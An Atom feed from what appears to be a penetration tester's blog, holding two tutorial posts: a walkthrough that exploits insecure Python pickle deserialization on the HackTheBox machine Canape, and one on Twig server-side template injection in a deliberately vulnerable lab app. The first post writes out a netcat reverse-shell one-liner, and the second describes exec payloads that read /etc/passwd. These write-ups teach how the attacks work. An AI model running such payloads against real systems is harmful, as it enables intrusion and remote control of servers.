<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-18T14:15:06-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">alex fox</title><subtitle>penetration tester</subtitle><entry><title type="html">Deserialization</title><link href="http://localhost:4000/Deserialization/" rel="alternate" type="text/html" title="Deserialization" /><published>2020-06-16T00:00:00-04:00</published><updated>2020-06-16T00:00:00-04:00</updated><id>http://localhost:4000/Deserialization</id><content type="html" xml:base="http://localhost:4000/Deserialization/">&lt;p&gt;What is Deserialization?&lt;/p&gt;

&lt;p&gt;Modern applications are often decentralized and as such, utilize multiple components (such as microservices) which often talk to one another and share and store data. Serialization is used to convert an object into something that can be shared across a network or stored in a file.&lt;/p&gt;

&lt;p&gt;For example, JSON is a popular choice for serializing complex data objects into simple strings so that they might be transported or stored. The restoration of serialized data back into their complex object form is known as deserialization.&lt;/p&gt;

&lt;p&gt;We first need to require ruby’s &lt;b&gt;“json”&lt;/b&gt; module.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-rb&quot; data-lang=&quot;rb&quot;&gt;&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;002&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'json'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;003&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glanton_gang&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;newbie: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;the kid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;outlaw: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;toadvine&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;priest: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tobin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;captain: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;glanton&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;devil: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;the judge&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:newbie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;the kid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:outlaw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;toadvine&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:priest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tobin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:captain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;glanton&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:devil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;the judge&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;004&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glanton_gang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;class&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Hash&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;005&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glanton_gang_json&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glanton_gang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_json&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;{&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;newbie&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;the kid&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;outlaw&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;toadvine&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;priest&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tobin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;captain&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;glanton&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;devil&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;the judge&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;}&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;006&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glanton_gang_json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;class&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;007&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This is a straightforward example of serialization, in which our data object of a hash is being converted into strings by way of the &lt;b&gt;to_json&lt;/b&gt; method. This makes our data language agnostic and ready to be stored in a file.&lt;/p&gt;

&lt;p&gt;Serialization is common in architectures that include APIs, microservices, and client-side MVC. When the data being serialized is trusted (such as, by the system), there is no issue. However, when a user can control or modify input, deserialization vulnerabilities can arise. The conversion back from string (or whatever form the serialized data is stored as) to binary can be tampered with and result in remote code execution. It’s important to note that not all forms of serialization involve serializing to strings, for example, one method of serializing data in python uses the &lt;b&gt;pickle&lt;/b&gt; module.&lt;/p&gt;

&lt;p&gt;Let’s take a look at the Python docs. Python’s &lt;a href=&quot;https://docs.python.org/3/library/pickle.html&quot;&gt;pickle module&lt;/a&gt; implements binary protocol for serializing and deserializing a python object. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy. In other words, pickling == serializing and depickling == deserializing.&lt;/p&gt;

&lt;h3&gt;Unsafe Deserialization: HTB's &lt;i&gt;Canape&lt;/i&gt;&lt;/h3&gt;

&lt;p&gt;We are going to be examining a small portion of the retired hackthebox (HTB) box &lt;b&gt;“Canape”&lt;/b&gt;, which contains a vulnerable pickle function that deserializes unsanitized user data. The box in question is hosting a flask application on port 80, and after running a gobuster scan with a lengthy wordlist we discover the git configuration file. We add this git subdomain to our /etc/hosts file and then we can view the flask app’s git repository. This will inform us on what’s going on behind the scenes and how to craft our exploit.&lt;/p&gt;

&lt;p&gt;The vulnerable page in question:
&lt;img src=&quot;/images/canape/quotes.png&quot; alt=&quot;Quotes form submission&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The vulnerable code in question:
&lt;img src=&quot;/images/canape/pickle-code-vuln.png&quot; alt=&quot;Flask app code&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is not the full &lt;b&gt;__init__.py&lt;/b&gt; file but it contains what we’re interested in. On the webpage we can see that we can submit a Simpsons’ character and a quote. Looking at the code, specifically the “submit” route, we can see that on a form submission the application looks for a character and quote. It then checks if the character is whitelisted. If the submitted character is whitelisted, then the code goes on to process the quote (regardless if the quote is valid; it only checks if the quote is empty or not), and stores the data in a pickle file with an md5 filename.&lt;/p&gt;

&lt;p&gt;The dangerous portion of this application is the above combined with the check route, which proceeds to open the file containing the user-submitted character and quote depending on an ‘id’ POST parameter. It then deserializes the user-submitted data by way of &lt;b&gt;cPickle.loads(data)&lt;/b&gt;. Thankfully, we know exactly how to name our file: &lt;b&gt;p_id = md5(char + quote).hexidigest()&lt;/b&gt;.&lt;/p&gt;

&lt;p&gt;So, to recap, we will be taking the following steps to exploit this unsafe deserialization:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Submit a valid character name&lt;/li&gt;
  &lt;li&gt;Submit a quote that is actually an os.system command that connects to our local listener&lt;/li&gt;
  &lt;li&gt;The application will load our data using &lt;b&gt;cPickle.loads(data)&lt;/b&gt;&lt;/li&gt;
  &lt;li&gt;Our exploit is triggered and our listener receives a shell&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We look at the vulnerable code as we craft our exploit. We need to import the following libraries:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Os: to run system commands&lt;/li&gt;
  &lt;li&gt;Requests: to made requests to the vulnerable flask application&lt;/li&gt;
  &lt;li&gt;Md5: to name our file properly (following the flask app’s file-naming convention)&lt;/li&gt;
  &lt;li&gt;cPickle: &lt;b&gt;cPickle&lt;/b&gt; is an optimized version of the pickle module written in C, and it is what our vulnerable application is using, so we will use it in the exploit&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Note that there is nothing inherently dangerous about the &lt;b&gt;pickle&lt;/b&gt; module, it’s only dangerous when you allow an untrusted source to be pickled/unpickled–as this web application is doing.&lt;/p&gt;

&lt;p&gt;Our exploit code:
&lt;img src=&quot;/images/canape/exploit.png&quot; alt=&quot;Exploit code&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A quick examination of our exploit code:&lt;/p&gt;

&lt;h6&gt;def __reduce__(self);&lt;/h6&gt;

&lt;p&gt;&lt;b&gt;pickle&lt;/b&gt; allows arbitrary objects to declare how they should be pickled by defining a &lt;strong&gt;reduce&lt;/strong&gt; method, which should return either a string or a tuple describing how to reconstruct this object on unpacking.&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;We are constructing a pickle that, upon unpickling, will execute:
&lt;b&gt;homer!;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.29 5555 &amp;gt;/tmp/f&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;For whatever reason I’m partial to the above one-liner, though it’s likely poor practice to assume netcat is on machines. From my previous experience of working on this box, I know the above will execute. However, if this wasn’t the case, there are plenty of other options for getting a shell, including calling upon python’s &lt;b&gt;subprocess&lt;/b&gt; module.&lt;/p&gt;

&lt;h6&gt;cPickle.dumps&lt;/h6&gt;
&lt;p&gt;Returns the pickled object as a bytes object (meaning, it is serialized).&lt;/p&gt;

&lt;h6&gt;char, quote = sc.split(“!”)&lt;/h6&gt;
&lt;p&gt;We are splitting the character and quote on the exclamation point, meaning, everything before the exclamation point is equal to the character (homer), everything after is the quote. We need to do this to adhere to the check performed on the character parameter.&lt;/p&gt;

&lt;h6&gt;p_id = md5(char + quote).hexdigest()&lt;/h6&gt;
&lt;p&gt;We are naming our file following the conventions set out in the flask application.&lt;/p&gt;

&lt;h6&gt;requests.post('http://10.10.10.70/submit', data={'character': char, 'quote': quote})&lt;/h6&gt;
&lt;p&gt;We are submitting a post request to the submit page, with our character and quote&lt;/p&gt;

&lt;h6&gt;requests.post('http://10.10.10.70/check', data={'id': p_id})&lt;/h6&gt;
&lt;p&gt;We are submitting a post request to the vulnerable check page, with the id of our pickled file. This triggers the vulnerable &lt;b&gt;cPickle.loads(data)&lt;/b&gt;, which deserializes our data and executes the connection back to our reverse shell.&lt;/p&gt;

&lt;p&gt;Now we will run our exploit, and voila, we have a shell!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/canape/shell.png&quot; alt=&quot;Shell&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:1&quot;&gt;
      &lt;p&gt;&lt;a href=&quot;https://blog.nelhage.com/2011/03/exploiting-pickle/&quot;&gt;https://blog.nelhage.com/2011/03/exploiting-pickle&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;</content><author><name></name></author><summary type="html">What is Deserialization?</summary></entry><entry><title type="html">Server Side Template Injection</title><link href="http://localhost:4000/SSTI/" rel="alternate" type="text/html" title="Server Side Template Injection" /><published>2020-04-20T00:00:00-04:00</published><updated>2020-04-20T00:00:00-04:00</updated><id>http://localhost:4000/SSTI</id><content type="html" xml:base="http://localhost:4000/SSTI/">&lt;p&gt;Template engines are becoming a popular choice in today’s webapp ecosystem and with them come a type of vulnerability known as SSTI, or Server Side Template Injection. A template engine uses static template files which at runtime replace variables or placeholders with actual values in the HTML page. This results in a webpage that appears more dynamic. SSTI vulnerabilities occur when user-controlled input is embedded within a template in an unsafe manner. SSTI can look similar to XSS vulnerabilities however, SSTIs are executed server side which is inherently more dangerous (as the user can gain control of the server).&lt;/p&gt;

&lt;p&gt;Examples of such template engines are: Twig, Freemarker, Flask, Jinja2.&lt;/p&gt;

&lt;p&gt;Let’s look at the examples provided by &lt;a href=&quot;https://portswigger.net/research/server-side-template-injection&quot;&gt;James Kettle&lt;/a&gt; to better understand what is going on with SSTI vulnerabilities.&lt;/p&gt;

&lt;p&gt;Let’s say we are using the Twig template to customize our greetings to users who sign up for our marketplace.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$twig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Dear &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;first_name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;first_name&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;first_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This example is fine because it is simply passing the user-controlled name into the variable of first_name.&lt;/p&gt;

&lt;p&gt;However, things become a bit more dangerous with the next example:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$twig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'custom_email'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;first_name&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;first_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here, the user can control the contents of the template itself and what is rendered in the email via the custom_email GET parameter, rather than simply passing a name into it. While this does create an XSS vulnerability, the SSTI vulnerability here enables the user to control what happens server-side.&lt;/p&gt;

&lt;p&gt;This type of vulnerability arises when developers allow for sandbox options for their templates, enabling users to control or edit templates how they see fit. It can also unintentionally occur when user input is concatenated directly into a template. Sound familiar? It should, as it’s similar to what occurs with SQL injections (please check out my previous post if you’d like to learn a bit more on SQL injection).&lt;/p&gt;

&lt;p&gt;To learn more about SSTI vulnerabilities and better understand Jame Kettle’s research, I set up &lt;a href=&quot;https://github.com/s4n7h0/xvwa&quot;&gt;XVWA&lt;/a&gt; (Xtreme Vulnerable Web App) which is an intentionally vulnerable web application (with an SSTI component).&lt;/p&gt;

&lt;p&gt;After I have the webapp up and running, I navigate to the SSTI pane.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ssti/senlin.png&quot; alt=&quot;Hello&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we have a basic webapp where a user can submit their name. Now, we have an advantage already knowing the type of template engine that is running (and also the fact we know there is an SSTI vulnerability) but we are going to walkthrough it following the steps of Detect, Identify, Exploit, which again are outlined in James Kettle’s research.&lt;/p&gt;

&lt;h3 id=&quot;detect&quot;&gt;Detect&lt;/h3&gt;

&lt;p&gt;There are various ways one can detect a potential SSTI, but here, we will use a simple math problem. Since the name submission is the only place on the page that manipulates data, we can deduce that the name submission is our injection point.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ssti/detect.png&quot; alt=&quot;Detect&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that instead of {{50+5}} being read as a string, the web application reads the user input as integers and performs math. It was likely expecting a string and something behind the scenes is not concatonating and/or not filtering the user input properly, ergo it does not read the data as a string but as integers being added together.&lt;/p&gt;

&lt;h3 id=&quot;identify&quot;&gt;Identify&lt;/h3&gt;

&lt;p&gt;The next step is to identify which template engine is being used. XVWA has unfortunately already spoiled the template engine in question (Twig). In general, however, we can engage in various probing methods, such as submitting different types of template engine syntax to see what is accepted, what errors out, etc.&lt;/p&gt;

&lt;p&gt;This tree for identifying templates is helpful:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ssti/identify-table.png&quot; alt=&quot;Identify Tree&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sourced from: &lt;a href=&quot;https://portswigger.net/research/server-side-template-injection&quot;&gt;James Kettle @ Portswigger&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So let’s pretend we don’t know which template engine is being used, and we submit {{7*‘7’}}&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ssti/identify.png&quot; alt=&quot;Identify&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Due to the resulting 49, we now know that we’re working with Twig. If it had been Jinja2, the result would be 7777777. If it had been neither a resulting 49 or 7777777, we would know to test other submissions for different template engines.&lt;/p&gt;

&lt;h3 id=&quot;exploit&quot;&gt;Exploit&lt;/h3&gt;

&lt;p&gt;After discovering which template engine is being used, we should read the documentation to better understand how we might exploit it. Another helpful resource that I use often in engagements is the PayloadsAllTheThings github, which has a nice resource on SSTI injections and specifically payloads relevant to Twig. However, while an amazing reference, we shouldn’t be blindly plugging stuff in.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig&quot;&gt;PayloadsAllTheThings: Twig&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let’s take a look at one of these examples and examine what’s going on behind the scenes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ssti/undefinedFunctiontwig.png&quot; alt=&quot;Markdown blows&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Twig is built on PHP. It has a function &lt;strong&gt;registerUndefinedFilterCallback()&lt;/strong&gt; that allows us to register native PHP functions as Twig functions. Thus, in the code snippet above, we are effectively registering php’s &lt;strong&gt;exec()&lt;/strong&gt; function as a Twig function. Php’s &lt;strong&gt;exec()&lt;/strong&gt; function is used to execute an external program and returns the last line of the output.&lt;/p&gt;

&lt;p&gt;I’m not entirely sure how the &lt;strong&gt;getFilter()&lt;/strong&gt; function works but somehow it uses the aforementioned defined function and extends its functionality to run the provided command (if anyone can better explain this please feel free to email me, I’ve read the docs but am still unsure). Here we are using it to specify which shell commands we want &lt;strong&gt;exec()&lt;/strong&gt; to execute.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ssti/get-id.png&quot; alt=&quot;Get ID&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exec()&lt;/strong&gt; works for us here because we are not attempting an information overflow, but trying to execute stuff on the server. If we wanted to retrieve the /etc/passwd file, for example, php’s ‘&lt;strong&gt;shell_exec()&lt;/strong&gt;’ function would be more useful to us as we wouldn’t be limited to receiving one line of output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ssti/exec-passwd.png&quot; alt=&quot;exec()&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ssti/shellexec-passwd.png&quot; alt=&quot;shell_exec()&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we know we have code execution, let’s try for a shell. I use my favorite reference, &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;Pentestmonkey Reverse Shell Cheatsheet&lt;/a&gt; to help me pick a suitable one-liner. We will plug in the nc reverse shell command into the &lt;strong&gt;getFilter()&lt;/strong&gt; portion of the function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ssti/nc-rev.png&quot; alt=&quot;Markdown blows pt2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We click submit and voila! We get a shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ssti/get-shell.png&quot; alt=&quot;Shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/ssti/shell.png&quot; alt=&quot;Shell&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://portswigger.net/research/server-side-template-injection&quot;&gt;James Kettle’s SSTI Research&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Template engines are becoming a popular choice in today’s webapp ecosystem and with them come a type of vulnerability known as SSTI, or Server Side Template Injection. A template engine uses static template files which at runtime replace variables or placeholders with actual values in the HTML page. This results in a webpage that appears more dynamic. SSTI vulnerabilities occur when user-controlled input is embedded within a template in an unsafe manner. SSTI can look similar to XSS vulnerabilities however, SSTIs are executed server side which is inherently more dangerous (as the user can gain control of the server).</summary></entry><entry><title type="html">SQL Injection</title><link href="http://localhost:4000/SQL-Injection/" rel="alternate" type="text/html" title="SQL Injection" 